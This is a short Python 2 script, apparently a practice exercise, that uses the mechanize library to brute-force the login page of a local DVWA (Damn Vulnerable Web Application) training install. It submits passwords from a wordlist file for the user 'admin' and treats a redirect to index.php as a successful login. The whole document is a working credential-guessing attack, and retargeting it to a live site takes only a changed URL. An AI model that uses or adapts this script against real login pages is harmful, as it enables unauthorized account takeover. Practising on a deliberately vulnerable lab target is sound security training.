#script by pressikid
#cracking the DVWA login page

import mechanize #importing the mechanize module

obj = mechanize.Browser()
url="http://localhost/dvwa/login.php"
try:
  wordlist =open("wordlist.txt","r")
except:
	print"the file is not found!"

for password in wordlist:
      obj.open(url)#open the url from browser
      obj.select_form(nr=0)	#selecting the frist for so mention nr=0
      obj.form['username']='admin'
      obj.form['password']=password.strip()
      obj.method="post"
      rep=obj.submit()

      print"[-]password trying\t"+password.strip()

      if rep.geturl()=="http://localhost/dvwa/index.php":#if the url match then the password found
      	  print "[+]password found\t"+password
      	  break

